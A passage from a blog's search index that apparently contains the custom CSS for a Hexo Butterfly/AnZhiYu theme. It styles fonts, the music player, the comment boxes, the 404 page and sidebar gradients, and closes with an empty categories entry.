  font-display: swap;
  font-weight: lighter;
} */
@font-face {
  font-family: ZhuZiAYuanJWD;
  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/ZhuZiAWan.woff2);
  font-display: swap;
  font-weight: lighter;
}

div#menus {
  font-family: "ZhuZiAYuanJWD";
}
h1#site-title {
  font-family: ZhuZiAYuanJWD;
  font-size: 3em !important;
}
a.article-title,
a.blog-slider__title,
a.categoryBar-list-link,
h1.post-title {
  font-family: ZhuZiAYuanJWD;
}

.iconfont {
  font-family: "iconfont" !important;
  font-size: 3em;
  /* 可以定义图标大小 */
  font-style: normal;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

/* 时间轴生肖icon */
svg.icon {
  /* 这里定义svg.icon，避免和Butterfly自带的note标签冲突 */
  width: 1em;
  height: 1em;
  /* width和height定义图标的默认宽度和高度*/
  vertical-align: -0.15em;
  fill: currentColor;
  overflow: hidden;
}

.icon-zhongbiao::before {
  color: #f7c768;
}

/* bilibli番剧插件 */
#article-container .bangumi-tab.bangumi-active {
  background: var(--anzhiyu-theme);
  color: var(--anzhiyu-ahoverbg);
  border-radius: 10px;
}
a.bangumi-tab:hover {
  text-decoration: none !important;
}
.bangumi-button:hover {
  background: var(--anzhiyu-theme) !important;
  border-radius: 10px !important;
  color: var(--anzhiyu-ahoverbg) !important;
}
a.bangumi-button.bangumi-nextpage:hover {
  text-decoration: none !important;
}
.bangumi-button {
  padding: 5px 10px !important;
}

a.bangumi-tab {
  padding: 5px 10px !important;
}
svg.icon.faa-tada {
  font-size: 1.1em;
}
.bangumi-info-item {
  border-right: 1px solid #f2b94b;
}
.bangumi-info-item span {
  color: #f2b94b;
}
.bangumi-info-item em {
  color: #f2b94b;
}

/* 解决artitalk的图标问题 */
#uploadSource > svg {
  width: 1.19em;
  height: 1.5em;
}

/*top-img黑色透明玻璃效果移除，不建议加，除非你执着于完全一图流或者背景图对比色明显 */
#page-header:not(.not-top-img):before {
  background-color: transparent !important;
}

/* 首页文章卡片 */
#recent-posts > .recent-post-item {
  background: rgba(255, 255, 255, 0.9);
}

/* 首页侧栏卡片 */
#aside-content .card-widget {
  background: rgba(255, 255, 255, 0.9);
}

/* 文章页面正文背景 */
div#post {
  background: rgba(255, 255, 255, 0.9);
}

/* 分页页面 */
div#page {
  background: rgba(255, 255, 255, 0.9);
}

/* 归档页面 */
div#archive {
  background: rgba(255, 255, 255, 0.9);
}

/* 标签页面 */
div#tag {
  background: rgba(255, 255, 255, 0.9);
}

/* 分类页面 */
div#category {
  background: rgba(255, 255, 255, 0.9);
}

/*夜间模式伪类遮罩层透明*/
[data-theme="dark"] #recent-posts > .recent-post-item {
  background: #121212;
}

[data-theme="dark"] .card-widget {
  background: #121212 !important;
}

[data-theme="dark"] div#post {
  background: #121212 !important;
}

[data-theme="dark"] div#tag {
  background: #121212 !important;
}

[data-theme="dark"] div#archive {
  background: #121212 !important;
}

[data-theme="dark"] div#page {
  background: #121212 !important;
}

[data-theme="dark"] div#category {
  background: #121212 !important;
}

[data-theme="dark"] div#category {
  background: transparent !important;
}
/* 页脚透明 */
#footer {
  background: transparent !important;
}

/* 头图透明 */
#page-header {
  background: transparent !important;
}

#rightside > div > button {
  border-radius: 5px;
}

/* 滚动条 */

::-webkit-scrollbar {
  width: 10px;
  height: 10px;
}

::-webkit-scrollbar-thumb {
  background-color: #3b70fc;
  border-radius: 2em;
}

::-webkit-scrollbar-corner {
  background-color: transparent;
}

::-moz-selection {
  color: #fff;
  background-color: #3b70fc;
}

/* 音乐播放器 */

/* .aplayer .aplayer-lrc {
  display: none !important;
} */

.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
  left: -66px !important;
  transition: all 0.3s;
  /* 默认情况下缩进左侧66px，只留一点箭头部分 */
}

.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
  left: 0 !important;
  transition: all 0.3s;
  /* 鼠标悬停是左侧缩进归零，完全显示按钮 */
}

.aplayer.aplayer-fixed {
  z-index: 999999 !important;
}

/* 评论框  */
.vwrap {
  box-shadow: 2px 2px 5px #bbb;
  background: rgba(255, 255, 255, 0.3);
  border-radius: 8px;
  padding: 30px;
  margin: 30px 0px 30px 0px;
}

/* 设置评论框 */

.vcard {
  box-shadow: 2px 2px 5px #bbb;
  background: rgba(255, 255, 255, 0.3);
  border-radius: 8px;
  padding: 30px;
  margin: 30px 0px 0px 0px;
}

/* md网站下划线 */
#article-container a:hover {
  text-decoration: none !important;
}

#article-container #hpp_talk p img {
  display: inline;
}

/* 404页面 */
#error-wrap {
  position: absolute;
  top: 40%;
  right: 0;
  left: 0;
  margin: 0 auto;
  padding: 0 1rem;
  max-width: 1000px;
  transform: translate(0, -50%);
}

#error-wrap .error-content {
  display: flex;
  flex-direction: row;
  justify-content: center;
  align-items: center;
  margin: 0 1rem;
  height: 18rem;
  border-radius: 8px;
  background: var(--card-bg);
  box-shadow: var(--card-box-shadow);
  transition: all 0.3s;
}

#error-wrap .error-content .error-img {
  box-flex: 1;
  flex: 1;
  height: 100%;
  border-top-left-radius: 8px;
  border-bottom-left-radius: 8px;
  background-color: #3b70fc;
  background-position: center;
  background-size: cover;
}

#error-wrap .error-content .error-info {
  box-flex: 1;
  flex: 1;
  padding: 0.5rem;
  text-align: center;
  font-size: 14px;
  font-family: Titillium Web, "PingFang SC", "Hiragino Sans GB", "Microsoft JhengHei", "Microsoft YaHei", sans-serif;
}
#error-wrap .error-content .error-info .error_title {
  margin-top: -4rem;
  font-size: 9em;
}
#error-wrap .error-content .error-info .error_subtitle {
  margin-top: -3.5rem;
  word-break: break-word;
  font-size: 1.6em;
}
#error-wrap .error-content .error-info a {
  display: inline-block;
  margin-top: 0.5rem;
  padding: 0.3rem 1.5rem;
  background: var(--btn-bg);
  color: var(--btn-color);
}

#body-wrap.error .aside-list {
  display: flex;
  flex-direction: row;
  flex-wrap: nowrap;
  bottom: 0px;
  position: absolute;
  padding: 1rem;
  width: 100%;
  overflow: scroll;
}

#body-wrap.error .aside-list .aside-list-group {
  display: flex;
  flex-direction: row;
  flex-wrap: nowrap;
  max-width: 1200px;
  margin: 0 auto;
}

#body-wrap.error .aside-list .aside-list-item {
  padding: 0.5rem;
}

#body-wrap.error .aside-list .aside-list-item img {
  width: 100%;
  object-fit: cover;
  border-radius: 12px;
}

#body-wrap.error .aside-list .aside-list-item .thumbnail {
  overflow: hidden;
  width: 230px;
  height: 143px;
  background: var(--anzhiyu-card-bg);
  display: flex;
}

#body-wrap.error .aside-list .aside-list-item .content .title {
  -webkit-line-clamp: 2;
  overflow: hidden;
  display: -webkit-box;
  -webkit-box-orient: vertical;
  line-height: 1.5;
  justify-content: center;
  align-items: flex-end;
  align-content: center;
  padding-top: 0.5rem;
  color: white;
}

#body-wrap.error .aside-list .aside-list-item .content time {
  display: none;
}


/* 侧边栏个人信息卡片动态渐变色 */
#aside-content > .card-widget.card-info {
  background: linear-gradient(
    -45deg,
    #e8d8b9,
    #eccec5,
    #ff9d60,
    #ff83a2,
    #eec1ea
  );
  box-shadow: 0 0 5px rgb(66, 68, 68);
  position: relative;
  background-size: 400% 400%;
  -webkit-animation: Gradient 10s ease infinite;
  -moz-animation: Gradient 10s ease infinite;
  animation: Gradient 10s ease infinite !important;
}
@-webkit-keyframes Gradient {
  0% {
    background-position: 0% 50%;
  }
  50% {
    background-position: 100% 50%;
  }
  100% {
    background-position: 0% 50%;
  }
}
@-moz-keyframes Gradient {
  0% {
    background-position: 0% 50%;
  }
  50% {
    background-position: 100% 50%;
  }
  100% {
    background-position: 0% 50%;
  }
}
@keyframes Gradient {
  0% {
    background-position: 0% 50%;
  }
  50% {
    background-position: 100% 50%;
  }
  100% {
    background-position: 0% 50%;
  }
}

/* 侧边栏个人信息卡片动态渐变色 */
#aside-content>.card-widget.card-info{
    background: linear-gradient(-45deg, rgba(255, 183, 197, 0.8), 
    rgb(234 138 138 / 80%), 
    rgb(255 184 184 / 80%), 
    rgba(255, 219, 111, 0.8));
}
[data-theme=dark] #aside-content>.card-widget.card-info {
    background: linear-gradient(-45deg, rgba(45, 45, 45, 0.8), 
    rgba(60, 60, 60, 0.8), 
    rgba(75, 75, 75, 0.8), 
    rgba(90, 90, 90, 0.8));
}


/*导航栏居中*/
	#nav-right{
    flex:1 1 auto;
    justify-content: flex-end;
    margin-left: auto;
    display: flex;
    flex-wrap:nowrap;
}




]]></content>
  </entry>
  <entry>
    <title>分类</title>
    <url>/categories/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
